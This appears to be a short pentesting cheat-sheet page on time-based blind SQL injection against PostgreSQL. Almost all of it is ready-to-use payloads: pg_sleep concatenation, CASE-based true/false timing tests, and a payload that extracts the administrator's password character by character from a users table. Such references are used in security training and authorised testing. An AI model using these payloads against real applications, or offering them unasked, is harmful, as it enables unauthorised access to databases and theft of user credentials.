---
description: Advanced PostgreSQL Injection Exploitation
---

# PostgreSQL

#### PostgreSQL time based blind SQLi

{% code overflow="wrap" %}
```sql
# (||) equals concatenation of strings
xyz' || pg_sleep(10)-- -

x';SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END-- -
x';SELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--

xyz' || (select case when substring(password,1,1)='y' then pg_sleep(5) else pg_sleep(0) end from users where username='administrator')-- -
```
{% endcode %}
